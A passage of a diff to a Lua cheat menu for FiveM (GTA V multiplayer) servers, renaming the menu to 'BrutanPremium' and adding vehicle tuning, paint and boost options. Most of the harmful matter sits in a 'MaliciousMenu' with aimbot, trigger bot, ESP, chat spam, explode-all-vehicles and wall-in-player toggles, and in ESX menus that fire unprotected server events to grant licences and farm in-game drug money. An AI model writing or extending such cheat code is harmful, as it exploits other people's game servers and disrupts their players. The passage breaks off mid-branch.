+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic2") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic2") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte2") then
+                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal2") then
+                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic3") then
+                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic3") then
+                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte3") then
+                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal3") then
+                    for dS, dT in pairs(bj) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false
+                     oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) 
+                     b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) 
+                     SetVehicleExtraColours(veh, oldpearl, dT.id) 
+                     b8 = true elseif b8 and currims == dT.id then 
+                        SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end;
+    
+                    BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("LSC") then
+			local veh = GetVehiclePedIsUsing(PlayerPedId())
+					if BrutanPremium.MenuButton('~r~→  ~s~~y~Handling ~s~editor', 'Hedit') then
+		elseif BrutanPremium.MenuButton("~r~→  ~s~~g~Performance ~s~Tuning", "performance") then
+        elseif BrutanPremium.MenuButton("~r~→  ~s~~b~Exterior ~s~Tuning", "tunings") then
+                elseif BrutanPremium.CheckBox(
+                    "Super Handling",
+                    superGrip,
+                    function(enabled)
+                        superGrip = enabled
+                        enchancedGrip = false
+                        driftMode = false
+                        fdMode = false
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Enhanced Grip",
+                    enchancedGrip,
+                    function(enabled)
+                        superGrip = false
+                        enchancedGrip = enabled
+                        driftMode = false
+                        fdMode = false
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Drift Mode",
+                    driftMode,
+                    function(enabled)
+                        superGrip = false
+                        enchancedGrip = false
+                        driftMode = enabled
+                        fdMode = false
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Formula Drift Mode",
+                    fdMode,
+                    function(enabled)
+                        superGrip = false
+                        enchancedGrip = false
+                        driftMode = false
+                        fdMode = enabled
+                    end)
+                then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~Vehicle Boost", "VehBoostMenu") then
+                elseif BrutanPremium.Button("Max Exterior Tuning") then
+                    MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
+                elseif BrutanPremium.Button("Max Performance") then
+                    MaxOutPerf(GetVehiclePedIsUsing(PlayerPedId()))
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('WeaponOptions') then
-                if VladmirAK47.Button('~h~Spawn Weapon') then
-                    GiveWeaponToPed(GetPlayerPed(-1), GetHashKey(dz.id), 1000, false)
-                end
-                if VladmirAK47.Button('~h~Add Ammo') then
-                    SetPedAmmo(GetPlayerPed(-1), GetHashKey(dz.id), 5000)
-                end
-                if
-                    VladmirAK47.CheckBox(
-                        '~h~Infinite ~s~Ammo',
-                        dz.bInfAmmo,
-                        function(ew)
-                        end
-                    )
-                 then
-                    dz.bInfAmmo = not dz.bInfAmmo
-                    SetPedInfiniteAmmo(GetPlayerPed(-1), dz.bInfAmmo, GetHashKey(dz.id))
-                    SetPedInfiniteAmmoClip(GetPlayerPed(-1), true)
-                    PedSkipNextReloading(GetPlayerPed(-1))
-                    SetPedShootRate(GetPlayerPed(-1), 1000)
-                end
-                for e0, ev in pairs(dz.mods) do
-                    if VladmirAK47.MenuButton('~h~~p~▶~s~ ~h~~p~▶ ~s~' .. e0, 'ModSelect') then
-                        dA = ev
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('ModSelect') then
-                for _, ev in pairs(dA) do
-                    if VladmirAK47.Button(ev.name) then
-                        GiveWeaponComponentToPed(GetPlayerPed(-1), GetHashKey(dz.id), GetHashKey(ev.id))
-                    end
-                end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('CarTypes') then
+
+                BrutanPremium.Display()
+		elseif BrutanPremium.IsMenuOpened("Hedit") then
+		if GetVehiclePedIsIn( PlayerPedId(), false ) ~= 0 then
+						if BrutanPremium.Button('Refresh Info') then
+                            chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) ) 
+							end
+			for i,theKey in pairs(chdata) do
+				if tonumber(theKey.value) then 
+					theKey.value = math.floor(tonumber(theKey.value) * 10^(3) + 0.5) / 10^(3)
+				end
+				if type(theKey.value) == "vector3" then
+					local v1,v2,v3 = table.unpack(theKey.value)
+					theKey.value = v1..","..v2..","..v3
+				end
+				theKey.value = tostring(theKey.value)
+				
+				if theKey.value and BrutanPremium.Button(theKey.name, theKey.value) then 
+						
+					
+						
+					AddTextEntry('FMMC_KEY_TIP12N', "Enter new "..theKey.name.." value :") 
+
+					DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP12N", "", theKey.value, "", "", "", 128 + 1)
+				
+					while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
+						Citizen.Wait( 0 )
+					end
+				
+					local result = GetOnscreenKeyboardResult()
+					if result then
+					
+						if theKey.type == "vector3" then
+							local x,y,z = table.unpack( mysplit( result, "," ) )
+							if x and y and z then
+								result = vector3(tonumber(x),tonumber(y),tonumber(z))
+							else
+								break
+							end
+						end
+						
+			
+								
+						SetVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(),false), theKey.name, result ) 
+						Wait(200)
+						chdata = GetAllVehicleHandlingData( GetVehiclePedIsIn( PlayerPedId(), false ) )
+					end
+					
+					
+				end
+			end
+        else
+		drawNotification("You're not sitting in a vehicle IDIOT!")
+			end
+		BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('CarTypes') then
                 for i, ex in ipairs(b3) do
-                    if VladmirAK47.MenuButton('~h~~p~▶~s~ ' .. ex, 'CarTypeSelection') then
+                    if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'CarTypeSelection') then
                         carTypeIdx = i
                     end
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('CarTypeSelection') then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('CarTypeSelection') then
                 for i, ex in ipairs(b4[carTypeIdx]) do
-                    if VladmirAK47.MenuButton('~h~~p~▶~s~ ~h~~p~▶~s~ ' .. ex, 'CarOptions') then
+                    if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'CarOptions') then
                         carToSpawn = i
                     end
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('CarOptions') then
-                if VladmirAK47.Button('~h~Spawn Car') then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('CarOptions') then
+                if BrutanPremium.Button('Spawn Infront Of You') then
                     local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                     local veh = b4[carTypeIdx][carToSpawn]
                     if veh == nil then
@@ -12625,33 +6591,59 @@ Citizen.CreateThread(
                                 ey = ey + 100
                                 Citizen.Wait(100)
                                 if ey > 5000 then
-                                    ShowNotification('~h~Cannot spawn this vehicle.')
+                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                     break
                                 end
                             end
                             SpawnedCar =
-                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 1, 1, 0)
+                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
                             SetVehicleStrong(SpawnedCar, true)
                             SetVehicleEngineOn(SpawnedCar, true, true, false)
                             SetVehicleEngineCanDegrade(SpawnedCar, false)
-							SetPedIntoVehicle(PlayerPedId(-1), SpawnedCar, -1)
+                        end
+                    )
+				elseif BrutanPremium.Button('Spawn In It') then
+                    local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
+                    local veh = b4[carTypeIdx][carToSpawn]
+                    if veh == nil then
+                        veh = 'adder'
+                    end
+                    vehiclehash = GetHashKey(veh)
+                    RequestModel(vehiclehash)
+                    Citizen.CreateThread(
+                        function()
+                            local ey = 0
+                            while not HasModelLoaded(vehiclehash) do
+                                ey = ey + 100
+                                Citizen.Wait(100)
+                                if ey > 5000 then
+                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
+                                    break
+                                end
+                            end
+                            SpawnedCar =
+                                CreateVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)
+                            SetVehicleStrong(SpawnedCar, true)
+							SetPedIntoVehicle(PlayerPedId(), SpawnedCar, -1)
+                            SetVehicleEngineOn(SpawnedCar, true, true, false)
+                            SetVehicleEngineCanDegrade(SpawnedCar, false)
                         end
                     )
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('MainTrailer') then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('MainTrailer') then
                 if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                     for i, ex in ipairs(b5) do
-                        if VladmirAK47.MenuButton('~h~~p~▶~s~ ~h~~p~▶~s~ ' .. ex, 'MainTrailerSpa') then
+                        if BrutanPremium.MenuButton('~r~→  ~s~' .. ex, 'MainTrailerSpa') then
                             TrailerToSpawn = i
                         end
                     end
                 else
                     av('~h~~w~Not in a vehicle', true)
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('MainTrailerSpa') then
-                if VladmirAK47.Button('~h~Spawn Car') then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened('MainTrailerSpa') then
+                if BrutanPremium.Button('Spawn Vehicle') then
                     local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
                     local veh = b5[TrailerToSpawn]
                     if veh == nil then
@@ -12666,7 +6658,7 @@ Citizen.CreateThread(
                                 ey = ey + 100
                                 Citizen.Wait(100)
                                 if ey > 5000 then
-                                    ShowNotification('~h~Cannot spawn this vehicle.')
+                                    ShowNotification('~h~~r~Cannot spawn this vehicle.')
                                     break
                                 end
                             end
@@ -12680,161 +6672,1910 @@ Citizen.CreateThread(
                         end
                     )
                 end
-                VladmirAK47.Display()
-            elseif VladmirAK47.IsMenuOpened('GWP') then
-                for i = 1, #b6 do
-                    if VladmirAK47.Button(b6[i]) then
-                        GiveWeaponToPed(GetPlayerPed(SelectedPlayer), GetHashKey(b6[i]), 1000, false, true)
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VehBoostMenu") then
+                if BrutanPremium.Button('Engine Power boost ~r~RESET') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
+			elseif BrutanPremium.Button('Engine Power boost ~g~x2') then
+					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x4') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x8') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x16') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x32') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x64') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x128') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~x512') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
+			elseif BrutanPremium.Button('Engine Power boost  ~g~ULTIMATE') then
+				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
+			end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("MaliciousMenu") then
+                if BrutanPremium.CheckBox(
+                    "Crosshair",
+                    crosshair,
+                    function(enabled)
+                        crosshair = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Crosshair 2",
+                    crosshair2,
+                    function(enabled)
+                         crosshair2 = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                    "Crosshair 3",
+                    crosshair3,
+                    function(enabled)
+                        crosshair3 = enabled
+                    end)
+                then
+                elseif BrutanPremium.CheckBox(
+                "~o~Thermal Vision",
+                thermalVision,
+                function(enabled)
+                    thermalVision = enabled
+                    SetSeethrough(thermalVision)
+                end)
+                then
+				elseif BrutanPremium.CheckBox(
+                "~p~Night Vision",
+                nightVision,
+                function(enabled)
+                    nightVision = enabled
+                    SetNightvision(nightVision)
+                end)
+                then
+				elseif BrutanPremium.CheckBox(
+				    "Christmas Weather",
+					XMAS,
+					function(enabled)
+					XMAS = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Foggy Weather",
+					FOGGY,
+					function(enabled)
+					FOGGY = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Clear Weather",
+					CLEAR,
+					function(enabled)
+					CLEAR = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Blizzard Weather",
+					BLIZZARD,
+					function(enabled)
+					BLIZZARD = enabled
+					end)
+					then
+				elseif BrutanPremium.CheckBox(
+				    "Extra Sunny Weather",
+					EXTRASUNNY,
+					function(enabled)
+					EXTRASUNNY = enabled
+					end)
+					then
+				elseif BrutanPremium.Button("Time set to night") then
+				NetworkOverrideClockTime(23, 50, 0)
+				elseif BrutanPremium.Button("Time set to day") then
+				NetworkOverrideClockTime(12, 12, 0)
+				elseif BrutanPremium.Button("Wall-in Legion Square") then
+                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
+                    roundx = tonumber(string.format('%.2f', x))
+                    roundy = tonumber(string.format('%.2f', y))
+                    roundz = tonumber(string.format('%.2f', z))
+                    local e8 = -145066854
+                    RequestModel(e8)
+                    while not HasModelLoaded(e8) do
+                        Citizen.Wait(0)
+                    end
+                    local e9 = CreateObject(e8, 258.91, -933.1, 26.21, true, true, false)
+                    local ea = CreateObject(e8, 200.91, -874.1, 26.21, true, true, false)
+					local e92 = CreateObject(e8, 126.52, -933.2, 26.21, true, true, false)
+					local ea2 = CreateObject(e8, 184.52, -991.2, 26.21, true, true, false)
+                    SetEntityHeading(e9, 158.41)
+                    SetEntityHeading(ea, 90.51)
+					SetEntityHeading(e92, 332.41)
+                    SetEntityHeading(ea2, 260.51)
+                    FreezeEntityPosition(e9, true)
+                    FreezeEntityPosition(ea, true)
+					FreezeEntityPosition(e92, true)
+                    FreezeEntityPosition(ea2, true)
+                elseif BrutanPremium.CheckBox(
+                    "AimBot",
+                    LOJ38,
+                    function(enabled)
+                        LOJ38 = enabled
+                    end)
+                then
+                elseif BrutanPremium.MenuButton('~r~→  ~s~ESP Menu', 'LulxDJ') then
+				elseif BrutanPremium.CheckBox(
+				"~g~EMP ~s~All Nearby Vehicles",
+				destroyvehicles,
+				function(enabled)
+				destroyvehicles = enabled
+				end) 
+			then
+				elseif BrutanPremium.CheckBox(
+				"~r~Explode ~s~All Nearby Vehicles",
+				explodevehicles,
+				function(enabled)
+				explodevehicles = enabled
+				end) 
+			then
+                elseif BrutanPremium.CheckBox(
+                    "Trigger Bot",
+                    TriggerBot,
+                    function(enabled)
+                        TriggerBot = enabled
+                    end)
+                then
+				 elseif
+                    BrutanPremium.CheckBox(
+                        'Chat Spam',
+                        chatspam,
+                        function(enabled)
+                            chatspam = enabled
+                        end
+                    )
+                 then
+
+                end
+
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened('LulxDJ') then
+                if
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~MasterSwitch',
+                        esp,
+                        function(enabled)
+                            esp = enabled
+                        end
+                    )
+                 then
+                elseif
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~Box',
+                        jfjfjffuhguh,
+                        function(enabled)
+                            jfjfjffuhguh = enabled
+                        end
+                    )
+                 then
+                elseif
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~Info',
+                        KDOWJDw,
+                        function(enabled)
+                            KDOWJDw = enabled
+                        end
+                    )
+                 then
+                elseif
+                    BrutanPremium.CheckBox(
+                        '~h~~r~ESP ~s~Lines',
+                        jfjfjf,
+                        function(enabled)
+                            jfjfjf = enabled
+                        end
+                    )
+                 then
+                end
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXMenu") then
+                if BrutanPremium.MenuButton("~r~→  ~s~ESX Money Options", "ESXMoneyMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Job Menu", "ESXJobMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Boss", "ESXBossMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Drugs", "ESXDrugMenu") then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~ESX Misc", "ESXMiscMenu") then
+                end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXMiscMenu") then
+                if BrutanPremium.Button("ESX Harvest FixKit") then
+                    TriggerServerEvent("esx_mechanicjob:startHarvest")
+				elseif BrutanPremium.Button    ("ESX Get all licenses ") then
+					TriggerServerEvent("dmv:success")
+					TriggerServerEvent('esx_weashopjob:addLicense', 'tazer')
+					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa')
+					TriggerServerEvent('esx_weashopjob:addLicense', 'ppa2')
+					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_bike')
+					TriggerServerEvent('esx_weashopjob:addLicense', 'drive_truck')
+					TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
+					TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
+					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_bike')
+					TriggerServerEvent('esx_dmvschool:addLicense', 'drive_truck')
+					TriggerServerEvent('esx_airlines:addLicense', 'helico')
+					TriggerServerEvent('esx_airlines:addLicense', 'avion')
+                elseif BrutanPremium.Button("ESX Craft FixKit") then
+                    TriggerServerEvent("esx_mechanicjob:startCraft")
+                end
+
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("ESXDrugMenu") then
+                if BrutanPremium.Button("Harvest Weed (x5)") then
+                    TriggerServerEvent("esx_drugs:startHarvestWeed")
+                    TriggerServerEvent("esx_drugs:startHarvestWeed")
+                    TriggerServerEvent("esx_drugs:startHarvestWeed")
+                    TriggerServerEvent("esx_drugs:startHarvestWeed")
+                    TriggerServerEvent("esx_drugs:startHarvestWeed")
+                elseif BrutanPremium.Button("Transform Weed (x5)") then
+                    TriggerServerEvent("esx_drugs:startTransformWeed")
+                    TriggerServerEvent("esx_drugs:startTransformWeed")
+                    TriggerServerEvent("esx_drugs:startTransformWeed")
+                    TriggerServerEvent("esx_drugs:startTransformWeed")
+                    TriggerServerEvent("esx_drugs:startTransformWeed")
+                elseif BrutanPremium.Button("Sell Weed (x5)") then
+                    TriggerServerEvent("esx_drugs:startSellWeed")
+                    TriggerServerEvent("esx_drugs:startSellWeed")
+                    TriggerServerEvent("esx_drugs:startSellWeed")
+                    TriggerServerEvent("esx_drugs:startSellWeed")
+                    TriggerServerEvent("esx_drugs:startSellWeed")
+                elseif BrutanPremium.Button("Harvest Coke (x5)") then
+                    TriggerServerEvent("esx_drugs:startHarvestCoke")
+                    TriggerServerEvent("esx_drugs:startHarvestCoke")
+                    TriggerServerEvent("esx_drugs:startHarvestCoke")
+                    TriggerServerEvent("esx_drugs:startHarvestCoke")
+                    TriggerServerEvent("esx_drugs:startHarvestCoke")
+                elseif BrutanPremium.Button("Transform Coke (x5)") then
+                    TriggerServerEvent("esx_drugs:startTransformCoke")
+                    TriggerServerEvent("esx_drugs:startTransformCoke")
+                    TriggerServerEvent("esx_drugs:startTransformCoke")
+                    TriggerServerEvent("esx_drugs:startTransformCoke")
+                    TriggerServerEvent("esx_drugs:startTransformCoke")
+                elseif BrutanPremium.Button("Sell Coke (x5)") then
+                    TriggerServerEvent("esx_drugs:startSellCoke")
+                    TriggerServerEvent("esx_drugs:startSellCoke")
+                    TriggerServerEvent("esx_drugs:startSellCoke")
+                    TriggerServerEvent("esx_drugs:startSellCoke")
+                    TriggerServerEvent("esx_drugs:startSellCoke")
+                elseif BrutanPremium.Button("Harvest Meth (x5)") then
+                    TriggerServerEvent("esx_drugs:startHarvestMeth")
+                    TriggerServerEvent("esx_drugs:startHarvestMeth")
+                    TriggerServerEvent("esx_drugs:startHarvestMeth")
+                    TriggerServerEvent("esx_drugs:startHarvestMeth")
+                    TriggerServerEvent("esx_drugs:startHarvestMeth")
+                elseif BrutanPremium.Button("Transform Meth (x5)") then
+                    TriggerServerEvent("esx_drugs:startTransformMeth")
+                    TriggerServerEvent("esx_drugs:startTransformMeth")
+                    TriggerServerEvent("esx_drugs:startTransformMeth")
+                    TriggerServerEvent("esx_drugs:startTransformMeth")
+                    TriggerServerEvent("esx_drugs:startTransformMeth")
+                elseif BrutanPremium.Button("Sell Meth (x5)") then
+                    TriggerServerEvent("esx_drugs:startSellMeth")
+                    TriggerServerEvent("esx_drugs:startSellMeth")
+                    TriggerServerEvent("esx_drugs:startSellMeth")
+                    TriggerServerEvent("esx_drugs:startSellMeth")
+                    TriggerServerEvent("esx_drugs:startSellMeth")
+                elseif BrutanPremium.Button("Harvest Opium (x5)") then
+                    TriggerServerEvent("esx_drugs:startHarvestOpium")
+                    TriggerServerEvent("esx_drugs:startHarvestOpium")
+                    TriggerServerEvent("esx_drugs:startHarvestOpium")
+                    TriggerServerEvent("esx_drugs:startHarvestOpium")
+                    TriggerServerEvent("esx_drugs:startHarvestOpium")
+                elseif BrutanPremium.Button("Transform Opium (x5)") then
+                    TriggerServerEvent("esx_drugs:startTransformOpium")
+                    TriggerServerEvent("esx_drugs:startTransformOpium")
+                    TriggerServerEvent("esx_drugs:startTransformOpium")
+                    TriggerServerEvent("esx_drugs:startTransformOpium")
+                    TriggerServerEvent("esx_drugs:startTransformOpium")
+                elseif BrutanPremium.Button("Sell Opium (x5)") then
+                    TriggerServerEvent("esx_drugs:startSellOpium")
+                    TriggerServerEvent("esx_drugs:startSellOpium")
+                    TriggerServerEvent("esx_drugs:startSellOpium")
+                    TriggerServerEvent ("esx_drugs:startSellOpium")
+                    TriggerServerEvent("esx_drugs:startSellOpium")
+                elseif BrutanPremium.Button("Money Wash (x10)") then
